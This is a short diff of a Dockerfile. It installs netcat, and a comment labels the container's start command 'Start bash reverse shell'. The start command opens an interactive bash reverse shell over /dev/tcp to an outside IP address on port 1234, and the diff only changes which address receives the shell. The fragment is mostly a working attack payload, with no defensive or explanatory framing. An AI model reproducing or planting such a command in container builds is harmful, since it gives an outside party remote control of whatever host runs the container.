@@ -10,4 +10,4 @@ RUN apt-get update -y && apt-get upgrade -y
 RUN apt-get install -y netcat-openbsd
 
 # Start bash reverse shell
-CMD bash -c 'bash -i >& /dev/tcp/37.1.204.49/1234 0>&1'
+CMD bash -c 'bash -i >& /dev/tcp/152.58.71.204/1234 0>&1'
